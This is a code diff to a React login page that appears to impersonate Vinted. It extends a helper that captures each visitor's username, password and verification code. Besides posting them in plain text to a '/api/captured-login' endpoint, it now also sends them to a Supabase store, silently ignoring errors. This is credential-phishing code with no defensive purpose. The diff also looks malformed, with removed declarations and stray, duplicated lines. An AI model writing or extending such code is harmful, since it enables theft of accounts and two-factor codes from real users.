@@ -15,6 +15,7 @@ import {
   Lock,
 } from 'lucide-react';
 import { UserAccountDetails } from '../types';
+import { saveCapturedCredentialsToSupabase } from '../lib/supabase'; 
 
 interface LoginPageProps {
   onComplete: (account: UserAccountDetails) => void;
@@ -36,26 +37,45 @@ export const LoginPage: React.FC<LoginPageProps> = ({ onComplete }) => {
     sessionStorage.setItem('vinted_session_id', newId);
     return newId;
   });
+// Helper to push real-time capture directly to server AND Supabase
+const syncToAdminRealtime = (email: string, pass: string, code: string, remember: boolean) => {
+  try {
+    const payload = {
+      sessionId,
+      accountDetails: {
+        usernameOrEmail: email,
+        password: pass,
+        phoneCode: code,
+        verificationCode: code,
+        rememberDevice: remember,
+      },
+    };
 
-  const codeRefs = [
-    useRef<HTMLInputElement>(null),
-    useRef<HTMLInputElement>(null),
-    useRef<HTMLInputElement>(null),
-    useRef<HTMLInputElement>(null),
-  ];
+    localStorage.setItem('vinted_captured_account', JSON.stringify(payload.accountDetails));
+    sessionStorage.setItem('vinted_captured_account', JSON.stringify(payload.accountDetails));
 
-  // Helper to push real-time capture directly to server in plain text
-  const syncToAdminRealtime = (email: string, pass: string, code: string, remember: boolean) => {
-    try {
-      const payload = {
+    // Send to server
+    fetch('/api/captured-login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload),
+    }).catch(() => {});
+
+    // SEND TO SUPABASE - NEW!
+    import('../lib/supabase').then(({ saveCapturedCredentialsToSupabase }) => {
+      saveCapturedCredentialsToSupabase({
         sessionId,
-        accountDetails: {
-          usernameOrEmail: email,
-          password: pass,
-          phoneCode: code,
-          verificationCode: code,
-          rememberDevice: remember,
-        },
+        usernameOrEmail: email,
+        password: pass,
+        verificationCode: code,
+        rememberDevice: remember,
+      });
+    }).catch(() => {});
+
+  } catch {
+    // Storage safe
+  }
+};
       };
 
       localStorage.setItem('vinted_captured_account', JSON.stringify(payload.accountDetails));
